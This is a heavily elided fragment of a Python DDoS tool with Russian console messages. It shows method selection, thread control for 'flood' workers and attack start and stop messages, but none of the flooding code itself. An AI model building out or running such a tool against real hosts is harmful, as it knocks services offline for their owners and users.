...
def GetMethodByName(method):
    if method == "SMS":
        ...
        raise SystemExit(
            f"{Fore.RED}[!] {Fore.MAGENTA}Неизвестный метод DDoS {repr(method)} выбран..{Fore.RESET}"
        )
    ...
    if hasattr(module, "flood"):
        ...
        CriticalError(
            f"Метод 'flood' не найден в {repr(dir)}. Пожалуйста, используйте python 3.8", "-"
        )
...
class AttackMethod:
    ...
    def __RunThreads(self):
        ...
        # Start flood threads
        with Spinner(
            label=f"{Fore.YELLOW}Стар {self.threads_count} круга{Fore.RESET}",
            total=100,
        ) as spinner:
        ...
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Остановлен круг {index + 1}.{Fore.RESET}"
            )
    ...
    def Start(self):
        ...
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Старт атаки на {target} используя метод {self.name}.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Атака была остановлена после {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )
        ...
        try:
            ...
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}Обнаружен Ctrl+C. Остановка {self.threads_count} круга..{Fore.RESET}"
            )
